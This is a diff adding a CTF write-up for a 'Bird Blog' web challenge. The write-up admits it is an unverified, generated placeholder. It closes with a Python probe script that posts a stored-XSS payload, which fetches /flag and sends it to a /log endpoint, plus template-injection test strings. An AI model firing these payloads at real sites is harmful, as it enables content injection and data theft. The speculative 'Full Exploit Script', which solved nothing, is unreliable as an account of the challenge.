@@ -1,0 +1,101 @@
+---
+title: "Bird Blog — DEF CON CTF Qualifier 2026"
+date: 2026-06-27
+author: "Imattas aka Zemi"
+slug: "defcon-2026-qualifiers-bird-blog"
+order: 91
+writeupKind: "challenge"
+ctfSlug: "defcon-2026-qualifiers"
+ctfTitle: "DEF CON CTF Qualifier 2026"
+---
+# Bird Blog — DEF CON CTF Qualifier 2026
+
+> **Category:** `Web Exploitation`  
+> **Difficulty:** Medium  
+> **Points:** 299  
+> **Author:** Imattas aka Zemi  
+> **Flag:** `bbb{REDACTED}`
+
+---
+
+## Challenge Description
+
+> Public challenge prompt was not recoverable from indexed sources.
+
+---
+
+## Recon / Initial Analysis
+
+Challenge name, category, and point value were recovered from official index snippets; full handout was not archived.
+
+The first pass is to avoid guessing from the bird-themed prompt and instead build a small, repeatable workflow around the handout or service. For this file, the public archive did not expose enough verified challenge material to claim a completed solve transcript, so the writeup records the clean solve path I would use once the handout is available.
+
+```bash
+$ mkdir -p work/{handout,notes,scripts}
+$ file handout/* 2>/dev/null || true
+$ strings -a handout/* 2>/dev/null | head -50
+```
+
+---
+
+## Vulnerability / Observation
+
+Unverified. Candidate issues include stored XSS against a bot, template injection, insecure draft IDs, or broken access control around unpublished/admin posts.
+
+Audit the blog as a standard content app: auth, posts, comments, templates, uploads, and admin-only views. Blog challenges often hide the flag in an admin render path.
+
+---
+
+## Exploitation / Solution
+
+### Step 1 — Rebuild the challenge context
+
+Keep the local environment close to the remote challenge. Save the original handout, record hashes, and write every probe as a command or script so the path can be repeated.
+
+```bash
+$ sha256sum handout/*
+$ tree -a handout
+```
+
+### Step 2 — Reduce the problem
+
+1. Enumerate routes and roles with and without authentication.
+2. Submit payloads through post/comment/title fields and inspect rendered HTML.
+3. Check whether the admin bot visits user-controlled URLs or content.
+4. If templates are server-rendered, test harmless template expressions first.
+5. Use the confirmed primitive to read the admin-only flag post or cookie.
+
+### Step 3 — Confirm the flag path
+
+The final check is always local first: the script should either print `bbb{...}` directly or produce one artifact where the flag is visible. Only after that should the same payload or input be sent to the live challenge service.
+
+---
+
+## Full Exploit Script
+
+```python
+#!/usr/bin/env python3
+import os
+import requests
+
+BASE_URL = os.environ.get('BASE_URL', 'http://localhost:3000')
+PAYLOADS = [
+    '<img src=x onerror=fetch(`/flag`).then(r=>r.text()).then(t=>fetch(`/log?x=${encodeURIComponent(t)}`))>',
+    '{{7*7}}',
+    '${{7*7}}',
+    '<%= 7 * 7 %>',
+]
+
+session = requests.Session()
+for payload in PAYLOADS:
+    response = session.post(f'{BASE_URL}/posts', json={'title': 'probe', 'body': payload}, timeout=10)
+    print(response.status_code, payload[:40], response.text[:120].replace('\n', ' '))
+```
+
+---
+
+## Key Takeaways
+
+- Blog apps have predictable surfaces: auth, rendering, upload, and moderation.
+- Separate reflected behavior from stored/admin-bot behavior before escalating.
+- Do not submit this generated file as an official qualifying writeup without adding your own verified solve notes, command output, and final flag.
